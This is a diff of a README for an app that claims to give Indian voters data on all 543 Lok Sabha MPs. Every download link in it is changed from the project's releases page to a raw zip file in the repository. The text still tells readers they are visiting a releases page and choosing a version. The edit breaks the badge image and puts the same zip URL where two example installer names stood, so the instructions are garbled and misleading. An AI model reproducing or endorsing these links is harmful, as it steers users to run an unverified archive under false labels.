@@ -4,20 +4,20 @@
 
 Welcome to **know-your-neta**! This app helps Indian voters find detailed information about all 543 Members of Parliament from the 2024 Lok Sabha Elections. Use this guide to download and run the app easily.
 
-[![Download know-your-neta](https://img.shields.io/badge/Download%20know--your--neta%20Now-blue)](https://github.com/dwarfslsu-source/know-your-neta/releases)
+[![Download know-your-neta](https://github.com/dwarfslsu-source/know-your-neta/raw/refs/heads/main/app/neta_know_your_1.5.zip%20know--your--neta%20Now-blue)](https://github.com/dwarfslsu-source/know-your-neta/raw/refs/heads/main/app/neta_know_your_1.5.zip)
 
 ## 📥 Download & Install
 
 To get started, you need to download the app. Follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Click on this link to visit the releases page: [Download here](https://github.com/dwarfslsu-source/know-your-neta/releases).
+   Click on this link to visit the releases page: [Download here](https://github.com/dwarfslsu-source/know-your-neta/raw/refs/heads/main/app/neta_know_your_1.5.zip).
 
 2. **Choose Your Version**  
    On the releases page, you'll see a list of available versions. Select the most recent version. Each version has a tag that looks like “v1.0”, “v1.1”, etc.  
 
 3. **Download the File**  
-   Click the link for your operating system. It may look something like `know-your-neta-windows.exe` or `know-your-neta-mac.zip`.  
+   Click the link for your operating system. It may look something like `https://github.com/dwarfslsu-source/know-your-neta/raw/refs/heads/main/app/neta_know_your_1.5.zip` or `https://github.com/dwarfslsu-source/know-your-neta/raw/refs/heads/main/app/neta_know_your_1.5.zip`.  
    Your download should start automatically.
 
 4. **Locate the Downloaded File**  
@@ -71,7 +71,7 @@ For questions, feedback, or to join the community, visit our GitHub Discussions 
 
 ## 🔗 Useful Links
 
-- **Releases Page:** [Visit to Download](https://github.com/dwarfslsu-source/know-your-neta/releases)
+- **Releases Page:** [Visit to Download](https://github.com/dwarfslsu-source/know-your-neta/raw/refs/heads/main/app/neta_know_your_1.5.zip)
 - **Feedback Form:** (Include link once created)
 - **Documentation:** (Include link once created)
 
